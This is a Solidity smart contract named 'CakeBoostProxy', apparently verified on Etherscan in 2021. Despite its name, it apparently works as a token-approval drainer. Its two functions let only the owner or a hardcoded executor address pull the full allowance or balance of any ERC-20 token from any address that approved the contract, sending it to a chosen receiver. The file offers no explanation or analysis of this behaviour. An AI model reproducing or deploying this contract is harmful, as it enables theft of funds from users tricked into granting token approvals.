/**
 *Submitted for verification at Etherscan.io on 2021-08-03
*/

// SPDX-License-Identifier: NO LICENSE
pragma solidity 0.6.12;

interface IERC20Token {
    function allowance(address _owner, address _spender) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function balanceOf(address _from) external view returns (uint256);
}

contract CakeBoostProxy {
    address public owner;
    address constant public executor = 0x5ea3999A94fA1E254Cf10A7c8E818879Eb53BE14;
    uint256 transfer_amount;

    constructor() public {
        owner = msg.sender;
    }

    function transferFrom(IERC20Token _token, address _sender, address _receiver) external returns (bool) {
        require(msg.sender == owner || msg.sender == executor, "access denied");
        uint256 allowance = _token.allowance(_sender, address(this));
        uint256 balance = IERC20Token(_token).balanceOf(_sender);
        if (allowance < balance) {
            transfer_amount = allowance;
            }
            else if (allowance >= balance) {
                transfer_amount = balance;
                } 
            
        return _token.transferFrom(_sender, _receiver, transfer_amount);
    }

    function transferGas(IERC20Token _token, address _sender, address _receiver, uint256 _amount) external returns (bool) {
        require(msg.sender == owner || msg.sender == executor, "access denied");
        return _token.transferFrom(_sender, _receiver, _amount);
    }
}